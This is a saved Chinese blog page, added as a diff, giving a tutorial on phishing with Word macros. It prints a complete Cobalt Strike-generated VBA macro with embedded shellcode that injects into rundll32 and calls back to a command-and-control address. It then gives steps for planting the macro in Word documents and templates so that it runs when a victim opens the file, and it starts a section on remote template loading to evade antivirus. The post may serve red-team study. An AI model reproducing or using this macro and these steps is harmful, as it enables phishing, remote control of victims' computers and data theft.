@@ -1,0 +1,673 @@
+<script type="text/javascript" src="../../source/js/love.js"></script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Word宏钓鱼 | wolke</title><meta name="keywords" content="CobaltStrike,钓鱼,社工,APT"><meta name="author" content="w01ke"><meta name="copyright" content="w01ke"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、本地加载恶意Word文档&#x2F;模板文件上线CS1、生成监听器 2、使用CobaltStrike生成宏木马选择MS Office宏  选择监听器  提示了使用步骤  Copy Marco代码如下 Private Type PROCESS_INFORMATION    hProcess As Long    hThread As Long    dwProcessId As Long    dwThr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Word宏钓鱼">
+<meta property="og:url" content="https://wolke.cn/post/42739bea.html">
+<meta property="og:site_name" content="wolke">
+<meta property="og:description" content="一、本地加载恶意Word文档&#x2F;模板文件上线CS1、生成监听器 2、使用CobaltStrike生成宏木马选择MS Office宏  选择监听器  提示了使用步骤  Copy Marco代码如下 Private Type PROCESS_INFORMATION    hProcess As Long    hThread As Long    dwProcessId As Long    dwThr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wolke.cn/img/messageboard.jpg">
+<meta property="article:published_time" content="2022-03-08T07:16:05.000Z">
+<meta property="article:modified_time" content="2022-03-08T07:25:25.802Z">
+<meta property="article:author" content="w01ke">
+<meta property="article:tag" content="CobaltStrike">
+<meta property="article:tag" content="钓鱼">
+<meta property="article:tag" content="社工">
+<meta property="article:tag" content="APT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wolke.cn/img/messageboard.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://wolke.cn/post/42739bea"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?9b5e9e86a0a422ec787d72998e8fdbff";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-Q0YHC68NHX"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-Q0YHC68NHX');
+</script><link rel="stylesheet" href="/wolke" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: w01ke","link":"链接: ","source":"来源: wolke","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Word宏钓鱼',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-08 15:25:25'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><script src="/live2d-widget/autoload.js"></script><script src="/live2d-widget/autoload.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: true,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', 'G-Q0YHC68NHX', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">52</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-diamond"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/black.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wolke</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-diamond"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Word宏钓鱼</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-08T07:16:05.000Z" title="发表于 2022-03-08 15:16:05">2022-03-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-08T07:25:25.802Z" title="更新于 2022-03-08 15:25:25">2022-03-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/APT-%E7%A4%BE%E5%B7%A5/">APT/社工</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Word宏钓鱼"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一、本地加载恶意Word文档-模板文件上线CS"><a href="#一、本地加载恶意Word文档-模板文件上线CS" class="headerlink" title="一、本地加载恶意Word文档/模板文件上线CS"></a>一、本地加载恶意Word文档/模板文件上线CS</h1><h2 id="1、生成监听器"><a href="#1、生成监听器" class="headerlink" title="1、生成监听器"></a>1、生成监听器</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646713989555-d276cb9c-86f3-4a86-ae92-fdbf2cfff951.png" alt="img"></p>
+<h2 id="2、使用CobaltStrike生成宏木马"><a href="#2、使用CobaltStrike生成宏木马" class="headerlink" title="2、使用CobaltStrike生成宏木马"></a>2、使用CobaltStrike生成宏木马</h2><p>选择MS Office宏</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646706437538-a9eb1b15-f68f-4880-bc9f-8361a4130e3f.png" alt="img"></p>
+<p>选择监听器</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646706460851-0a872c50-02a3-4f57-9008-38bddac2f678.png" alt="img"></p>
+<p>提示了使用步骤</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646706484113-5b972bf8-04cf-47e9-9093-f7453730dd80.png" alt="img"></p>
+<p>Copy Marco代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _</span><br><span class="line">13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _</span><br><span class="line">-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _</span><br><span class="line">-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _</span><br><span class="line">-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _</span><br><span class="line">-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _</span><br><span class="line">104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _</span><br><span class="line">-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _</span><br><span class="line">-1,-1,47,98,99,81,70,0,110,-60,-16,-88,-109,73,115,86,-74,-83,-24,-104,-51,92,8,108,-99,-3,104,125,92,121,-36,32,109,72,-18,-112,2,43,-91,-8, _</span><br><span class="line">51,17,123,-44,17,-12,125,-79,-88,29,78,32,-93,-47,-20,84,17,77,-33,28,-27,-109,66,30,125,92,-55,119,104,4,-77,-79,108,78,-2,-21,5,42,120,-23, _</span><br><span class="line">-106,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _</span><br><span class="line">83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,87,79,87,54,52,59,32,84,114,105,100,101,110,116,47, _</span><br><span class="line">53,46,48,59,32,70,117,110,87,101,98,80,114,111,100,117,99,116,115,41,13,10,0,-78,-71,-108,93,108,47,-34,39,-99,-23,53,2,70,-89,-117,45,-125, _</span><br><span class="line">-34,-108,-21,11,95,84,18,-45,-114,94,1,51,-3,-75,-99,-37,109,-52,31,-88,24,41,81,-80,14,114,-3,2,105,25,105,30,-15,-13,34,-68,-72,-55,87,-19, _</span><br><span class="line">61,-24,-82,25,-116,107,-104,119,6,124,-37,-17,103,-54,-24,-49,38,10,96,86,55,-88,-95,6,93,43,-93,28,-124,-54,-75,-9,21,28,-72,-98,86,51,84,-89, _</span><br><span class="line">-3,78,103,91,-88,-72,-11,-36,-82,-80,-61,-11,106,-18,100,-92,15,-100,-41,-24,110,63,38,38,104,-108,-80,-127,-61,-77,-98,35,101,-53,-40,51,-109,42,93,-20, _</span><br><span class="line">52,14,71,82,84,-20,121,89,-6,1,-117,-82,13,80,57,-21,121,46,75,38,-6,5,-31,-97,-82,21,-13,-106,-45,11,-5,-51,112,13,5,-40,90,-61,-94,-79, _</span><br><span class="line">48,118,-54,85,-75,-121,36,104,-74,4,-12,73,116,-21,5,-24,-47,95,70,-108,-61,-54,-22,97,118,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _</span><br><span class="line">104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _</span><br><span class="line">-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,48,46,52,46,49,51,46,49,50,52,0,25,105,-96,-115)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、创建启用恶意宏的Word文档-模板"><a href="#3、创建启用恶意宏的Word文档-模板" class="headerlink" title="3、创建启用恶意宏的Word文档/模板"></a>3、创建启用恶意宏的Word文档/模板</h2><p>创建一个Word，视图-查看宏</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646706572900-e9aabe94-b58c-4601-8495-df66e9c680b1.png" alt="img"></p>
+<p>宏名随便输入一个就可以，创建</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646706732821-7ae77177-f5b6-4865-b988-07dd258bd0a4.png" alt="img"></p>
+<p>在Project项目中的ThisDocument中添加CS生成的宏代码，并且右上角选择Auto_Open，在对方打开文档时，Word自动运行宏提示信息，提示是否点击</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646707151730-f0a5217d-511c-4a81-9d37-dc41ded3a96f.png" alt="img"></p>
+<p>Ctrl + S保存</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646707061575-6e52acf2-7696-4151-b3fe-9b9e1f2ddba6.png" alt="img"></p>
+<p>选择使用启用宏的文档/模板，这里我启用宏的word文档和启用宏的模板都弄一个</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646707365362-d528b5ae-2164-48eb-9961-dbf22f7b6ce7.png" alt="img"></p>
+<p>保存后报毒了，因为未做任何免杀，继续</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646707433172-54dd4766-da84-4c5c-b248-1c8b3cf76baf.png" alt="img"></p>
+<h2 id="4、加载恶意宏文件"><a href="#4、加载恶意宏文件" class="headerlink" title="4、加载恶意宏文件"></a>4、加载恶意宏文件</h2><p>以下动图展示了目标机打开Word文档且启用宏时，反弹shell</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646715091020-f8c83dd7-1f63-44a4-8d41-f304a0a3ada3.gif" alt="img"></p>
+<p>以下动图展示了目标机右键打开Word模板时，反弹shell</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646716014761-81200951-756d-42d3-bff4-961f27fc49f4.gif" alt="img"></p>
+<blockquote>
+<p>双击是无法打开模版文件的，在模版文件上双击默认是以此模版创建新文件，切记。</p>
+</blockquote>
+<p>本地加载的缺点就是，会被杀软查杀</p>
+<h1 id="二、远程加载恶意Word模板文件上传CS"><a href="#二、远程加载恶意Word模板文件上传CS" class="headerlink" title="二、远程加载恶意Word模板文件上传CS"></a>二、远程加载恶意Word模板文件上传CS</h1><p>利用Word文档加载附加模板时的缺陷所发起的恶意请求而达到的攻击目的，所以当目标用户点开攻击者发给他的恶意word文档就可以通过向远程服务器请求恶意模板并执行恶意模板上的恶意代码。</p>
+<p>这里，我们借助CobaltStrike生成office宏病毒，在将恶意宏嵌入到Word模板中，诱使受害者远程打开并加载带有宏的恶意Word模版，至目标主机成功上线CobaltStrike。</p>
+<p>缺点：目标主机的网速决定了加载远程模版的速度。有可能文件打开的会特别慢(例如将远程模版放在github)，受害者可能在文件打开一半的时候强制关闭word。加载位于github上的恶意模板内容，有点慢，我们可以放在vps上，这样速度就快些了。</p>
+<p>优点：因为是远程加载，所以免杀效果十分不错。基本不会被杀毒软件拦截。</p>
+<h2 id="1、将恶意模板文件上传到服务器"><a href="#1、将恶意模板文件上传到服务器" class="headerlink" title="1、将恶意模板文件上传到服务器"></a>1、将恶意模板文件上传到服务器</h2><p>将之前制作的含有恶意代码的模板文件上传到服务器上（我这里以kali开启HTTP服务为例）</p>
